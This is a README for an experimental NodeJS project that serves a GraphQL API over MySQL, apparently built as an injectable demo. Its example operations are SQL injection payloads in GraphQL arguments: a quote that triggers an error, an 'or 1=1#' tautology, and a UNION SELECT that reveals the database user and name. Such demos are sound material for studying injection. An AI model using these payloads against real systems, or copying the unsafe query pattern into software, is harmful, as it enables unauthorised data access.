NodeJS graphQL MySQL example
==================================

This is a simple experimental example of how to match graphql-js and MySQL for the implementation of a GraphQL API.

- This project requires a version of NodeJS with support for async-await

Getting Started
---------------

```sh
# clone the project
git clone git@github.com:YuLeven/nodejs-graphql-mysql-example.git
cd nodejs-graphql-mysql-example

# Install dependencies
npm install

# Run the server
PORT=8085 MYSQL_DB_USER=root MYSQL_DB_NAME=exapp MYSQL_DB_PASSWORD= MYSQL_DB_ADDRESS=localhost MYSQL_DB_POOL_SIZE=10 npm start

# Access GraphQLi
http://localhost:8085/graphql
```

Please remember to export the example SQL schema located in ./sql/exapp.sql

## Example operations

### See SQL Error
```js
{
  bacon(id:"1'"){
    id,
    price,
    type
  }
}
```
#### Show all bacons
```js
{
  bacons(type:"chunky'or 1=1#"){
    id,
    price,
    type
  }
}

```

### Show current use anddatabase 
```js
{
  bacons(type:"13.0' union select current_user(),database(),3 and 1=1#"){
    id,
    price,
    type
  }
}
```





License
-------

MIT
